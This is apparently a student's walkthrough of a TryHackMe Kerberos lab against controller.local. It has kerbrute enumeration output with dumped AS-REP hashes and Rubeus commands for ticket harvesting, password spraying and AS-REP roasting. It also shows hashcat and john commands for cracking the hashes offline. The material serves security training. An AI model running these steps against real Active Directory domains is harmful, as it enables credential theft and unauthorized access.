
Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required  
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/KerberosServer]
└─$ ./kerbrute_linux_arm64 userenum --dc controller.local -d controller.local User.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 07/15/23 - Ronnie Flathers @ropnop

2023/07/15 02:08:15 >  Using KDC(s):
2023/07/15 02:08:15 >  	controller.local:88

2023/07/15 02:08:16 >  [+] admin2 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$admin2@CONTROLLER.LOCAL:84203eb47382ab108f087a8f71e26793$74fac605e2896f26411ddb8cba84732b91e68d1601678634d78d4ce7b2a3a1ffad20c932851252d3e60e9690d75115454c780b723781861893e7a90aae07c772a5a91b38800245112ee792b7c5c81cf635f38b9391fb80ce4a2684f05a10770b03a006826edb2086ad40b81e68688ad25692e1b3dd28790dd009195de15f4a04497b41d8c6d78e610342c211d7cc58d57225be1d7d3bccfcb0dfc926eb4ace798e39d9b5aaa0f15efd24dfeb8622403bd5cd5c1509ced0f7972dead1570b0028e347f16afc39ed9c954f3f58c7566b05160396534f431149f8b5314856f62ab401530395047e5963b72e8b7b4e9db133bc43f8803fcc0fe705e99071c510b3decfc7fa4a28458bb7
2023/07/15 02:08:16 >  [+] VALID USERNAME:	 admin2@controller.local
2023/07/15 02:08:16 >  [+] VALID USERNAME:	 administrator@controller.local
2023/07/15 02:08:16 >  [+] VALID USERNAME:	 admin1@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 machine1@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 httpservice@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 machine2@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 sqlservice@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 user2@controller.local
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 user1@controller.local
2023/07/15 02:08:18 >  [+] user3 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$user3@CONTROLLER.LOCAL:cfd082113588ece7e2f7f88ec7c70109$2616e42936ecde934a0a914e0c17d82bb68c40125bbd3e074db286f8ef21e3e0f6e37e3f6f4def7ceadd2da1dd7121e9cad4f2b3f964ed6b2ad262a7eb2e0635d60ae849080f903c1ebfb4180cc6b5cfb6a4ab5e0923c8504004423ccd73005aef02f5d64d75492ab90724266c780c7084ddc00d917ec9737d87ecedecd9ad3ee83e5c39176e76e065d6224f868e1f616318c0f832efe820b18a87ed00cf7625542214c2045c76089211bde291bb6edf693c7c6c0dffcef9f950d0a547a62dc674b45ef03af23a0a8e6894cfd9049cd89584e82569ecfcdb3e1b1179d3a076bb52547b7d708bdd9ae01949e9f5cca5e9d31b6d033faadc05faaed7185106592bc2ab2ba3e005970d
2023/07/15 02:08:18 >  [+] VALID USERNAME:	 user3@controller.local
2023/07/15 02:08:18 >  Done! Tested 100 usernames (10 valid) in 2.331 seconds
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/KerberosServer]
```


harvest with `rubeus`

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 60 seconds for new TGTs
[*] Displaying the working TGT cache every 1200 seconds
```

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

`echo 10.10.236.67 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1.) `cd Downloads` - navigate to the directory Rubeus is in

2.) `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

![](https://i.imgur.com/WN4zVo5.png)

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.


In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.[](https://tryhackme.com/room/postexploit)

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.



Crack Kerberos hash
`hashcat`
```sh
hashcat -m 13100 -a 0 hash.txt pass.txt
```

`john`
```sh
john hash.txt --format=krb5tgs --wordlist=pass.txt
```


Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

![](https://i.imgur.com/arAImcA.png)

Dumping KRBASREP5 Hashes w/ Rubeus -

1.) `cd Downloads` - navigate to the directory Rubeus is in

2.) `Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

![](https://i.imgur.com/l3wJhby.png)